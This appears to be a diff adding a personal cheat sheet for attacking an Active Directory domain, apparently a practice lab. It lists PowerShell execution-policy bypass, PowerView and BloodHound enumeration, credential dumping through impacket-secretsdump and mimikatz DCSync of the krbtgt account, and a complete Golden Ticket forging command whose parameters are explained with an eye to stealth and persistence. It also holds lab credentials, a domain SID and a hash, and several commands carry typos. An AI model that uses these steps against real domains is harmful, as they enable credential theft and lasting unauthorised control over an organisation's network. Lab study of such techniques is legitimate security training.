@@ -1,0 +1,74 @@
+powershell -ep bypas
+. .\PowerView.ps1
+
+Enumerate the domain users
+Get-NetUser | select cn
+
+Enumerate the domain groups - 
+Get-NetGroup -GroupName *admin*
+
+GET DEVICE NAME
+hostname
+
+Get Domain name 
+systeminfo | findstr /B /C:"Domain"
+or 
+(Get-WmiObject Win32_ComputerSystem).Domain
+
+- enm blood hound 
+rusthound -d CONTROLLER.local -u 'Administrator' -p 'P@$$W0rd' -i 10.81.129.117 --zip -o CONTROLLER_local.zip
+
+or 
+1.) powershell -ep bypass same as with PowerView
+
+2.) . .\Downloads\SharpHound.ps1    
+
+3.) Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip    
+
+
+
+
+
+neo4j://127.0.0.1:7687
+
+
+
+
+#Golden Ticket
+
+dmping cred 
+impacket-secretsdump 'CONTROLLER.local/Administrator:P@$$W0rd'@10.81.151.27
+or 
+mimiikatz from windows 
+token::debug
+privilege::debug
+lsadump::dcsync /user:controller\krbtgt /domain:controller.local
+or
+lsadump::dcsync /user:krbtgt
+ 
+
+then from mimkatz 
+mimikatz.exe "kerberos::golden /user:Admin2 /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /rc4:5508500012cc005cf7082a9a89ebdfdf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+Identity & Domain
+/user:Admin2: The username you want to impersonate. It doesn't even have to exist; the DC will believe whoever is in the ticket.
+
+/domain:controller.local: The Fully Qualified Domain Name (FQDN) of the target domain.
+
+/sid:S-1-5-21-...: The Domain SID. This is the unique identifier for your specific domain environment.
+
+2. Encryption (The "Key")
+/rc4:5508...: This is the NTLM hash of the krbtgt account. It is used to sign and encrypt the Ticket Granting Ticket (TGT). Without this, the ticket is invalid.
+
+3. Time Constraints (Stealth & Persistence)
+/startoffset:0: Adjusts the ticket's start time. 0 means start right now. Negative values (e.g., -10) make the ticket look older to bypass clock synchronization issues.
+
+/endin:600: Total lifetime of the ticket in minutes. (600 = 10 hours). Default Mimikatz behavior is often 10 years if not specified.
+
+/renewmax:10080: Maximum renewal period in minutes. (10080 = 7 days). This allows the ticket to be refreshed without generating a new one.
+
+4. Execution
+/ptt (Pass-the-Ticket): This injects the generated ticket directly into the memory (LSASS process) of your current session. You gain instant access without saving a file to disk.
+
+"exit": Closes Mimikatz immediately after the command finishes.
+
+note to get sid -> whoam /user     
